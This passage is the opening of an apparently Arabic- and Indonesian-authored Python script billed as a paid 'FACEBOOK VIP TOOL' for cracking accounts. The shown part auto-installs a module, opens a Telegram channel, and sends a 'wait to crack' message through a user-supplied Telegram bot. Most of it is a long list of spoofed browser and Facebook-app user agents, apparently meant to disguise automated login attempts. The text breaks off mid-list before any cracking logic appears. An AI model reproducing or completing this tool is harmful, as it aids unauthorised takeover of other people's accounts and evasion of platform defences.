from rich.panel import Panel as Ch
from rich import print as code

import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import os,requests,sys,time,datetime
now = datetime.datetime.today()
an = datetime.datetime.now()
an2 = datetime.datetime(2024, 1, 28, 00, 0)
hours = (now.hour)


try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
import webbrowser
webbrowser.open('https://t.me/SGS5G')
print('')
print('\n')
print('''
               ███████╗  █████╗  ██╗ ██████╗
               ╚══███╔╝ ██╔══██╗ ██║ ██╔══██╗
                 ███╔╝  ███████║ ██║ ██║  ██║
                ███╔╝   ██╔══██║ ██║ ██║  ██║
               ███████╗ ██║  ██║ ██║ ██████╔╝
               ╚══════╝ ╚═╝  ╚═╝ ╚═╝ ╚═════╝
    ''')
token=input('\033[1;31m توكن يحلو : ')
print('\n')
ID=input('\033[1;31m ايديك   : ')
KV = '''WELCOME TO FACEBOOK VIP TOOL 

اهلا بك في اداة فيس بوك المدفوعة

<><><><><><><><><><><><><><>

WAIT TO CRACK MY FRIEND ♡

انتظر الصيد ياصديقي ولاتنسى صور الصيد 🔪🗿

<><><><><><><><><><><><><><>
@uvuxv ¦ @SGS5G'''
requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(KV))
os.system('clear')
pretty.install()
CON=sol() 
user_agent=['Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36 EdgA/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/119.0.2151.78 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5; rv:123.0esr) Gecko/20100101 Firefox/123.0esr', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/117.0.2045.48 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/121.0.2277.107 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0.1 Safari/605.1.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 OPX/2.1.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36 EdgA/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/121.0.2277.107 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 8.1.0; C5 2019 Build/OPM2.171019.012) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Safari/605.1.15', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Agency/98.8.8188.80', 'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Herring/95.1.1930.31', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Unique/97.7.7286.70', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Android 8.1.0; Mobile; rv:123.0) Gecko/123.0 Firefox/123.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Trailer/93.3.3695.30', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/119.0.2151.105 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 OPT/4.2.3', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0 Config/92.2.7601.2', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/120.0.2210.141 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Viewer/99.9.9009.89', 'Mozilla/5.0 (Linux; Android 8.1.0; Moto G (4)) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36 PTST/240201.144844', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/118.0.2088.68 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/121.0.2277.107 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) CriOS/122.0.6261.62 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 OPT/4.3.1', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36 EdgA/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'Mozilla/5.0 (Linux; Android 8.1.0; Moto G (4)) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36 PTST/240201.144844', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/118.0.2088.68 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/121.0.2277.107 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36 Agency/98.8.8175.80', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 17_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 DuckDuckGo/7 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/120.0.2210.86 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Viewer/99.9.9009.89', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/120.0.2210.86 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Unique/97.7.7286.70', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 Herring/95.1.1930.31', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36 Config/92.2.2788.20', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 GLS/100.10.9979.100', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/120.0.2210.141 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0 OpenWave/94.4.4504.39', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/119.0.2151.78 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Safari/537.36 Agency/98.8.8175.80', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/121.0.2277.99 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/121.0.2277.107 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0 Config/91.2.2121.13', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 OPX/2.1.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/120.0.2210.126 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) EdgiOS/118.0.2088.68 Version/17.0 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36']
uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; 